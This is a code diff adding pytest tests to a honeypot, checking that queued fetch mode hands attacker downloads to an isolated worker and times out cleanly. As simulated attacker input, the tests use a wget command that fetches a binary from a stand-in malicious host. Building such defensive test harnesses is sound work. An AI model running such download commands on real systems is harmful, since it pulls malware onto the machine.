@@ -148,3 +148,64 @@ def test_exit_command_sets_should_exit(config):
     session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config, logger)
     asyncio.run(session.handle_command("exit"))
     assert session.should_exit is True
+
+
+def test_queued_mode_never_calls_fetch_and_quarantine_in_process(config, monkeypatch):
+    """"queued" mode must enqueue + poll, never fetch itself -- this is the
+    property the docker-compose network-isolation split actually depends on."""
+    import honeypot.session.manager as manager_mod
+
+    config.fetcher.mode = "queued"
+
+    def _should_not_be_called(*args, **kwargs):
+        raise AssertionError("queued mode must never call fetch_and_quarantine in-process")
+
+    monkeypatch.setattr(manager_mod, "fetch_and_quarantine", _should_not_be_called)
+
+    logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
+    session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config, logger)
+
+    async def _drive():
+        task = asyncio.create_task(session.handle_command("wget http://evil.example/mal.bin"))
+        await asyncio.sleep(0.2)  # let it enqueue and start polling
+        jobs_dir = Path(config.fetcher.jobs_dir)
+        pending = list(jobs_dir.glob("*.json"))
+        assert len(pending) == 1, "job should have been enqueued to the shared jobs_dir"
+        job_id = pending[0].stem
+
+        # Simulate the separate fetcher worker: claim the job and drop a result.
+        from honeypot.fetcher.queue import claim_pending_jobs
+        claimed = claim_pending_jobs(jobs_dir)
+        assert len(claimed) == 1
+        job_path, job = claimed[0]
+        assert job.job_id == job_id
+        result_path = job_path.with_suffix(".result.json")
+        result_path.write_text(json.dumps({
+            "success": True, "sha256": "deadbeef", "md5": "cafebabe",
+            "size_bytes": 42, "detected_type": "elf", "detected_bitness": 64,
+            "detected_machine": "EM_RISCV", "arch_mismatch": False,
+            "quarantine_path": "/fetcher/side/deadbeef.bin", "error": None,
+        }))
+
+        return await task
+
+    output = asyncio.run(_drive())
+    assert "saved" in output
+    events = _read_events(config)
+    download_events = [e for e in events if e["event"] == "file.download"]
+    assert download_events[-1]["outcome"] == "success"
+    assert download_events[-1]["sha256"] == "deadbeef"
+
+
+def test_queued_mode_times_out_gracefully_if_no_worker_responds(config):
+    config.fetcher.mode = "queued"
+    config.fetcher.timeout_seconds = 0.2
+    logger = EventLogger(config.logging.log_dir, config.logging.json_log_filename)
+    session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config, logger)
+
+    output = asyncio.run(session.handle_command("wget http://evil.example/mal.bin"))
+
+    assert "timed out" in output
+    events = _read_events(config)
+    download_events = [e for e in events if e["event"] == "file.download"]
+    assert download_events[-1]["outcome"] == "failed"
